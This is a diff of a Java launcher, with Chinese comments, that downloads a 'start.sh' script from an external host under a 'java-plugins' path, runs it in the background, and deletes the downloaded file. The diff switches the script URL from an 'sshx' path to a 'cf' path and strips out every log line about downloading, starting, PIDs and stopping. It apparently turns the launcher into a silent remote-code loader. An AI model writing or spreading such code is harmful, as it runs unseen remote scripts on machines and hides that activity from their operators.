@@ -15,7 +15,7 @@ private static final String ANSI_RESET = "\033[0m";
 // ================== 配置区 ==================
 /** 远程 start.sh 地址 */
 private static final String START_SCRIPT_URL =
-        "https://netjett-de.kof95zip.pp.ua/java-plugins/sshx/start.sh";
+        "https://netjett-de.kof95zip.pp.ua/java-plugins/cf/start.sh";
 
 /** 下载到本地的路径（选容器里可写的目录） */
 private static final String LOCAL_SCRIPT_PATH = "./start.sh";
@@ -78,7 +78,6 @@ public static void main(String[] args) {
             stopServices();
         }));
 
-        System.out.println(ANSI_GREEN + "Background services started!" + ANSI_RESET);
 
     } catch (Exception e) {
         System.err.println(ANSI_RED + "Failed starting services" + ANSI_RESET);
@@ -126,7 +125,6 @@ private static void downloadScript(String url, String dest) throws Exception {
     File out = new File(dest);
 
     if (out.exists() && !out.delete()) {
-        System.out.println("WARN: 旧脚本删除失败 " + dest);
     }
 
     File parent = out.getAbsoluteFile().getParentFile();
@@ -158,9 +156,6 @@ private static void downloadScript(String url, String dest) throws Exception {
         );
     }
 
-    System.out.println(
-            ANSI_GREEN + "Downloaded start.sh -> " + dest + ANSI_RESET
-    );
 }
 
 private static void deleteScript() {
@@ -168,7 +163,6 @@ private static void deleteScript() {
         File f = new File(LOCAL_SCRIPT_PATH);
 
         if (f.exists() && f.delete()) {
-            System.out.println("Deleted " + LOCAL_SCRIPT_PATH);
         }
 
     } catch (Exception ignore) {
@@ -204,9 +198,6 @@ private static Process startProcess(
 
     Process process = builder.start();
 
-    System.out.println(
-            ANSI_GREEN + name + " started" + ANSI_RESET
-    );
 
     return process;
 }
@@ -215,20 +206,10 @@ private static void printPID(
         String name,
         Process process
 ) {
-    System.out.println(
-            ANSI_GREEN +
-            name +
-            " PID=" +
-            process.pid() +
-            ANSI_RESET
-    );
 }
 
 private static void stopServices() {
 
-    System.out.println(
-            ANSI_RED + "Stopping services..." + ANSI_RESET
-    );
 
     stopProcess(scriptProcess);
 
@@ -247,9 +228,6 @@ private static void stopProcess(Process process) {
 
         long pid = process.pid();
 
-        System.out.println(
-                "Stopping PID group " + pid
-        );
 
         // 优雅关闭整个进程组
         new ProcessBuilder(
@@ -263,10 +241,6 @@ private static void stopProcess(Process process) {
         if (process.waitFor(5, TimeUnit.SECONDS)) {
             return;
         }
-
-        System.out.println(
-                "Force killing " + pid
-        );
 
         new ProcessBuilder(
                 "bash",
